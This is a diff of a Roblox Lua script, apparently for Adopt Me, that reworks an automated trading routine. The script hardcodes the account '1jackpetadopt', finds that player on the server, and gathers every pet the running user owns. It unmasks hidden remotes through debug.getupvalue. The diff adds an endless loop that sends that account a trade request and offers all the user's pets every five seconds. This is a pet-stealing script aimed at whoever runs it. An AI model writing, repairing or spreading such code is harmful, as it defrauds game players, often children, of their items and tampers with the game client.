@@ -1,10 +1,20 @@
-local wait = task.wait
-repeat wait() until game:IsLoaded()
 local Players = game:GetService("Players")
-local VirtualUser = game:GetService("VirtualUser")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ReplicatedFirst = game:GetService("ReplicatedFirst")
+local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local Lighting = game:GetService("Lighting")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Debris = game:GetService("Debris")
+local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
+local VirtualUser = game:GetService("VirtualUser")
+
 local Player = Players.LocalPlayer
+local wait = task.wait
 local nickname = "1jackpetadopt"
 
 
@@ -71,10 +81,6 @@ end
 
 tp()
 
-for i, v in pairs(debug.getupvalue(require(game:GetService("ReplicatedStorage").Fsys).load("RouterClient").init, 4)) do
-    v.Name = i
-end
-
 spawn(function()
     while true do
         wait(0.03)
@@ -84,6 +90,9 @@ spawn(function()
     end
 end)
 
+for i, v in pairs(debug.getupvalue(require(game:GetService("ReplicatedStorage").Fsys).load("RouterClient").init, 4)) do
+    v.Name = i
+end
 
 for i,v in pairs(Players:GetPlayers()) do
     if v.Name == (nickname) or v.Name:find(nickname) or v.DisplayName == nickname or v.DisplayName:find(nickname) then
@@ -91,7 +100,6 @@ for i,v in pairs(Players:GetPlayers()) do
     end 
 end
 
-ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
 
 local petslist = {}
 
@@ -99,12 +107,12 @@ for i,v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_da
     table.insert(petslist, v.unique)
 end
 
-for i, v in pairs(petslist) do
-    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v)
-end
-
 while true do
+    pcall(function()  
+    ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(Playt)
+    end)
     wait(5)
+
     for i, v in pairs(petslist) do
         ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v)
     end
